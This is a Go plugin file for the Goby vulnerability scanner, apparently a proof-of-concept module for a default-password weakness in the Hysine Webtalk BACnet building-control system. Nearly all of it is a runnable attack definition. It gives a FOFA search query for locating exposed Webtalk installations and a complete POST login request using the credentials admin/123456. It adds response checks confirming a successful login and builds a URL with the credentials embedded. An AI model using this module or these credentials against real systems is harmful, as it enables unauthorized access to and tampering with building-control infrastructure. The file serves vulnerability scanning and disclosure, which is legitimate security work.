package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Hysine webtalk defaulte password vulnerability",
    "Description": "<p>Hysine webtalk is the world's leading BACnet control system</p><p> there is a weak password vulnerability in hysine webtalk system, which can be used by attackers to obtain sensitive information.</p>",
    "Impact": "Hysine webtalk defaulte password vulnerability",
    "Recommendation": "<p>It is recommended that the administrator modify the background management password to prevent malicious login from tampering with the system and causing potential security risks.</p>",
    "Product": "Hysine",
    "VulType": [
        "Default Password"
    ],
    "Tags": [
        "Default Password"
    ],
    "Translation": {
        "CN": {
            "Name": "Hysine Webtalk 默认口令漏洞",
            "Description": "<p>Hysine Webtalk是世界领先的BACnet控制系统。</p><p>Hysine Webtalk系统存在默认口令，攻击者可利用该漏洞获取敏感信息。<br></p>",
            "Impact": "<p>Hysine Webtalk系统存在默认口令，攻击者可利用该漏洞获取敏感信息。<br></p>",
            "Recommendation": "<p>建议管理员修改后台管理口令，防止恶意登录对系统篡改，造成安全隐患。</p>",
            "Product": "Hysine",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Hysine webtalk defaulte password vulnerability",
            "Description": "<p>Hysine webtalk is the world's leading BACnet control system</p><p> there is a weak password vulnerability in hysine webtalk system, which can be used by attackers to obtain sensitive information.</p>",
            "Impact": "Hysine webtalk defaulte password vulnerability",
            "Recommendation": "<p>It is recommended that the administrator modify the background management password to prevent malicious login from tampering with the system and causing potential security risks.</p>",
            "Product": "Hysine",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "FofaQuery": "title=\"WEBtalk\" && body=\"webtalk\"",
    "GobyQuery": "title=\"WEBtalk\" && body=\"webtalk\"",
    "Author": "9429658@qq.com",
    "Homepage": "http://www.hysine.com/",
    "DisclosureDate": "2021-12-03",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": false,
    "Is0day": false,
    "Level": "1",
    "CVSS": "4.5",
    "CVEIDs": [],
    "CNVD": [
        "CNVD-2021-43459"
    ],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/_webtalk/_cur/loginA.php",
                "follow_redirect": false,
                "header": {
                    "Cache-Control": "max-age=0",
                    "Upgrade-Insecure-Requests": "1",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "userID=admin&pwdID=123456"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "O_Alarm_NoRecord",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "url=init.php",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|define|variable|admin:123456",
                "vulurl|define|variable|{{{scheme}}}://admin:123456@{{{hostinfo}}}/_webtalk/_cur/loginA.php"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/_webtalk/_cur/loginA.php",
                "follow_redirect": false,
                "header": {
                    "Cache-Control": "max-age=0",
                    "Upgrade-Insecure-Requests": "1",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "userID=admin&pwdID=123456"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "O_Alarm_NoRecord",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "url=init.php",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|define|variable|admin:123456",
                "vulurl|define|variable|{{{scheme}}}://admin:123456@{{{hostinfo}}}/_webtalk/_cur/loginA.php"
            ]
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "7365"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
